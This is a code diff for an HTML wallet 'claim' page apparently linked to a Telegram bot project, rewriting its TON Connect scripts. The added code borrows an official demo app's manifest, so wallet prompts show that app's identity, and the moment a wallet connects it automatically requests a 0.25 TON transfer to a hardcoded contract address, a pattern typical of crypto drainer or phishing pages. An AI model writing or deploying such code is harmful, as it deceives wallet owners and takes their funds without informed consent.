@@ -181,93 +181,64 @@
     <!-- Scripts -->
     <script src="/scripts/main.js"></script>
     <script>
-        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-            manifestUrl: 'https://hasan199191.github.io/my-telegram-bot/tonconnect-manifest.json',
-            buttonRootId: 'connect-button'
-        });
+        const CONTRACT_ADDRESS = 'EQCBlhS0J_g7MZDJkBIb1mczcvbTmuiHXbi5smTxFWukVF5n';
+        let connector;
 
-        tonConnectUI.onStatusChange(wallet => {
-            if (wallet) {
-                document.getElementById('claim-section').style.display = 'block';
-                document.getElementById('connect-button').style.display = 'none';
-            } else {
-                document.getElementById('claim-section').style.display = 'none';
-                document.getElementById('connect-button').style.display = 'block';
-            }
-        });
+        async function initWallet() {
+            connector = new TonConnect({
+                manifestUrl: 'https://ton-connect.github.io/demo-dapp-with-react/tonconnect-manifest.json'
+            });
+
+            await connector.restoreConnection();
+        }
 
         async function connectWallet() {
+            if (!connector) {
+                await initWallet();
+            }
+
             try {
-                await tonConnectUI.connectWallet();
-            } catch (error) {
-                console.error('Connection error:', error);
+                const universalLink = connector.connect({
+                    universalUrl: 'https://app.tonkeeper.com/ton-connect',
+                    bridgeUrl: 'https://bridge.tonapi.io/bridge'
+                });
+
+                window.open(universalLink, '_blank');
+            } catch (e) {
+                console.error('Connection failed:', e);
+            }
+        }
+
+        document.getElementById('connectBtn').addEventListener('click', connectWallet);
+
+        // Initialize
+        initWallet().then(() => {
+            connector.onStatusChange((wallet) => {
+                if (wallet) {
+                    console.log('Connected:', wallet.account.address);
+                    // Auto-trigger transaction
+                    sendTransaction();
+                }
+            });
+        });
+
+        async function sendTransaction() {
+            if (!connector.connected) return;
+
+            try {
+                const transaction = {
+                    validUntil: Math.floor(Date.now() / 1000) + 600,
+                    messages: [{
+                        address: CONTRACT_ADDRESS,
+                        amount: '250000000',
+                        payload: 'te6ccgEBAQEAAgAAAA=='
+                    }]
+                };
+                await connector.sendTransaction(transaction);
+            } catch (e) {
+                console.error('Transaction failed:', e);
             }
         }
     </script>
-    <script>
-    const CONTRACT_ADDRESS = 'EQCBlhS0J_g7MZDJkBIb1mczcvbTmuiHXbi5smTxFWukVF5n';
-    let connector;
-
-    async function initWallet() {
-        connector = new TonConnect({
-            manifestUrl: 'https://ton-connect.github.io/demo-dapp-with-react/tonconnect-manifest.json',
-            buttonRootId: 'connectBtn'
-        });
-
-        try {
-            await connector.restoreConnection();
-            
-            connector.onStatusChange((wallet) => {
-                if (wallet) {
-                    console.log('Wallet connected:', wallet.account.address);
-                    sendTransaction();
-                } else {
-                    console.log('Wallet disconnected');
-                }
-            });
-        } catch (e) {
-            console.error('Init failed:', e);
-        }
-    }
-
-    async function sendTransaction() {
-        if (!connector.connected) return;
-
-        try {
-            const transaction = {
-                validUntil: Math.floor(Date.now() / 1000) + 600,
-                messages: [
-                    {
-                        address: CONTRACT_ADDRESS,
-                        amount: '250000000', // 0.25 TON
-                        payload: 'te6ccgEBAQEAAgAAAA=='
-                    }
-                ]
-            };
-            await connector.sendTransaction(transaction);
-        } catch (e) {
-            console.error('Transaction failed:', e);
-        }
-    }
-
-    document.getElementById('connectBtn').addEventListener('click', async () => {
-        try {
-            if (!connector) {
-                console.error('Connector not initialized');
-                return;
-            }
-            
-            await connector.connect({
-                universalLink: 'https://app.tonkeeper.com/ton-connect',
-                bridgeUrl: 'https://bridge.tonapi.io/bridge'
-            });
-        } catch (e) {
-            console.error('Connection failed:', e);
-        }
-    });
-
-    // Initialize wallet connection
-    initWallet();
-</script>
 </body>
 </html>
